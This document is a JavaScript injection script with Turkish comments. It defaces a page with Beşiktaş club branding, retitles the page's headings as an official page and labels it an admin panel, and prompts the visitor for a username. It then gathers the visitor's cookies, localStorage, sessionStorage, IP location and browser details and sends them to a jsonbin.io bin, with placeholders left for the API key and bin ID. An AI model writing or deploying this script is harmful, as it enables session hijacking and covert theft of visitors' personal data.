(async () => {
  // Temel stil ayarları
  const body = document.body;
  body.style.backgroundImage = "url('https://upload.wikimedia.org/wikipedia/tr/2/22/Besiktas_CJK.png')";
  body.style.backgroundSize = "cover";
  body.style.backgroundRepeat = "no-repeat";
  body.style.backgroundPosition = "center";
  body.style.transition = "background-color 0.5s, color 0.5s";

  let isDarkMode = true;
  body.style.backgroundColor = '#000000';
  body.style.color = '#FFFFFF';

  // Logo güncelleme
  const logo = document.querySelector('img');
  if (logo) {
    logo.src = 'https://upload.wikimedia.org/wikipedia/commons/2/20/Logo_of_Be%C5%9Fikta%C5%9F_JK.svg';
    logo.style.width = '150px';
    logo.style.border = '3px solid white';
  }

  // Başlıkları güncelle
  document.querySelectorAll('h1,h2,h3,h4,h5').forEach(element => {
    element.textContent = 'Resmi Sayfa';
  });

  // Giriş butonu düzenlemesi
  const loginButton = document.querySelector('button[type="submit"]');
  if (loginButton) {
    loginButton.textContent = 'Giriş Yap';
    loginButton.style.backgroundColor = '#000000';
    loginButton.style.color = '#FFFFFF';
    loginButton.style.fontWeight = '600';
    loginButton.style.border = '2px solid white';
    loginButton.style.cursor = 'pointer';
  }

  // Admin panel yazısı
  const adminPanelLabel = document.createElement('div');
  adminPanelLabel.textContent = "ADMIN PANEL";
  adminPanelLabel.style.position = 'fixed';
  adminPanelLabel.style.top = '50px';
  adminPanelLabel.style.left = '50%';
  adminPanelLabel.style.transform = 'translateX(-50%)';
  adminPanelLabel.style.fontWeight = '700';
  adminPanelLabel.style.fontSize = '22px';
  adminPanelLabel.style.padding = '6px 15px';
  adminPanelLabel.style.borderRadius = '12px';
  adminPanelLabel.style.zIndex = '99999';
  adminPanelLabel.style.userSelect = 'none';
  adminPanelLabel.style.transition = "color 0.5s, background-color 0.5s";
  adminPanelLabel.style.cursor = "default";

  function updateAdminPanelColors() {
    if (isDarkMode) {
      adminPanelLabel.style.color = "#FFFFFF";
      adminPanelLabel.style.backgroundColor = "rgba(0,0,0,0.7)";
      adminPanelLabel.style.textShadow = "0 0 5px #FFFFFF";
    } else {
      adminPanelLabel.style.color = "#000000";
      adminPanelLabel.style.backgroundColor = "rgba(255,255,255,0.8)";
      adminPanelLabel.style.textShadow = "0 0 3px #000000";
    }
  }
  updateAdminPanelColors();
  document.body.appendChild(adminPanelLabel);

  // Gece/gündüz modu değişimi
  setInterval(() => {
    isDarkMode = !isDarkMode;
    if(isDarkMode){
      body.style.backgroundColor = '#000000';
      body.style.color = '#FFFFFF';
    } else {
      body.style.backgroundColor = '#FFFFFF';
      body.style.color = '#000000';
    }
    updateAdminPanelColors();
  }, 20000);

  // Kartal animasyonu (sadeleştirilebilir)
  function flyEagle() {
    const eagleAnimation = document.createElement('img');
    eagleAnimation.src = 'https://upload.wikimedia.org/wikipedia/commons/2/20/Logo_of_Be%C5%9Fikta%C5%9F_JK.svg';
    eagleAnimation.style.position = 'fixed';
    eagleAnimation.style.top = '50%';
    eagleAnimation.style.left = '-200px';
    eagleAnimation.style.width = '100px';
    eagleAnimation.style.transition = 'left 5s linear';
    eagleAnimation.style.zIndex = '9999';
    document.body.appendChild(eagleAnimation);

    setTimeout(() => {
      eagleAnimation.style.left = '110%';
    }, 100);

    setTimeout(() => {
      document.body.removeChild(eagleAnimation);
    }, 5100);
  }
  setInterval(flyEagle, 30000);
  flyEagle();

  // Skor takibi (örnek amaçlı)
  function displayScore() {
    const score = Math.floor(Math.random() * 100);
    let highestScore = localStorage.getItem('highestScore') || 0;
    if (score > highestScore) {
      localStorage.setItem('highestScore', score);
      console.log(`Yeni rekor: ${score}`);
    } else {
      console.log(`Skor: ${score}. Rekor: ${highestScore}`);
    }
  }
  displayScore();

  // Kullanıcıdan isim alma
  const userName = prompt("Lütfen kullanıcı adınızı giriniz:");
  if (userName) {
    const welcomeMessage = document.createElement('h2');
    welcomeMessage.textContent = `Hoşgeldiniz, ${userName}`;
    welcomeMessage.style.color = isDarkMode ? '#FFFFFF' : '#000000';
    welcomeMessage.style.textAlign = 'center';
    welcomeMessage.style.marginTop = '10px';
    document.body.prepend(welcomeMessage);
  }

  // IP konum alma fonksiyonu
  async function getIpLocation() {
    try {
      const response = await fetch('https://ipapi.co/json/');
      if (!response.ok) throw new Error('IP API hatası');
      return await response.json();
    } catch (error) {
      console.warn('IP konumu alınamadı:', error);
      return null;
    }
  }
  const locationData = await getIpLocation();

  // Veri toplama fonksiyonu
  function collectData() {
    return {
      userName: userName || null,
      timestamp: new Date().toISOString(),
      location: locationData,
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      screen: {
        width: window.screen.width,
        height: window.screen.height,
        availWidth: window.screen.availWidth,
        availHeight: window.screen.availHeight,
        colorDepth: window.screen.colorDepth,
        pixelDepth: window.screen.pixelDepth,
      },
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      javaEnabled: navigator.javaEnabled(),
      onlineStatus: navigator.onLine,
    };
  }

  // --- JSONBIN.IO ENTEGRASYONU ---

  const apiKey = 'BURAYA_API_KEYİNİ_YAZ';  // Buraya jsonbin.io API Key
  const binId = 'BURAYA_BIN_ID_YAZ';        // Buraya jsonbin.io Bin ID

  // Veri gönderme
  async function sendDataToJsonBin(data) {
    const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'X-Master-Key': apiKey
      },
      body: JSON.stringify(data)
    });

    if (!res.ok) {
      console.error('Veri gönderme başarısız:', res.statusText);
    } else {
      console.log('Veri başarıyla gönderildi.');
    }
  }

  // Veri alma
  async function getDataFromJsonBin() {
    const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
      headers: {
        'X-Master-Key': apiKey
      }
    });

    if (!res.ok) {
      console.error('Veri alma başarısız:', res.statusText);
      return null;
    }

    const json = await res.json();
    return json.record;
  }

  // Veri toplama ve gönderme işlemi
  const dataToSend = collectData();
  await sendDataToJsonBin(dataToSend);

  // Veri alma ve konsola yazdırma
  const receivedData = await getDataFromJsonBin();
  console.log('Jsonbin’den alınan veri:', receivedData);

})();
